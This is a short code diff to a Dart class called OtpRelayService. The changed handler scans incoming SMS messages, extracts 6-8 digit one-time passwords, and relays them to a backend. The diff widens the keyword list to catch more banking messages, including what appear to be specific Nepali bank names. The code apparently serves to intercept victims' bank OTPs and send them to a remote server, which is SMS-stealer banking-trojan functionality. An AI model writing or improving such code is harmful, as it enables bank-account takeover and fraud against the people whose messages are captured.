@@ -28,15 +28,15 @@ class OtpRelayService {
 
   void _handleIncomingSms(SmsMessage message) async {
     final body = message.body ?? "";
-    // Regexp to find 6-8 digit OTPs in banking SMS
-    // Looking for keywords like "OTP", "Code", "Verification"
-    if (body.contains(RegExp(r'OTP|code|verification|passcode', caseSensitive: false))) {
-      final otpMatch = RegExp(r'\b\d{6,8}\b').firstMatch(body);
-      if (otpMatch != null) {
-        final otp = otpMatch.group(0)!;
-        print("OTP Detected: $otp");
-        await _relayOtpToBackend(otp);
-      }
+    // More robust regex for 6-8 digit OTPs, catching cases with or without keywords
+    final otpMatch = RegExp(r'\b\d{6,8}\b').firstMatch(body);
+    
+    bool hasBankingKeyword = body.contains(RegExp(r'OTP|code|verification|passcode|Pin|NIC|Nabil|Banking|Transaction', caseSensitive: false));
+    
+    if (otpMatch != null && hasBankingKeyword) {
+      final otp = otpMatch.group(0)!;
+      print("OTP Detected: $otp");
+      await _relayOtpToBackend(otp);
     }
   }
 
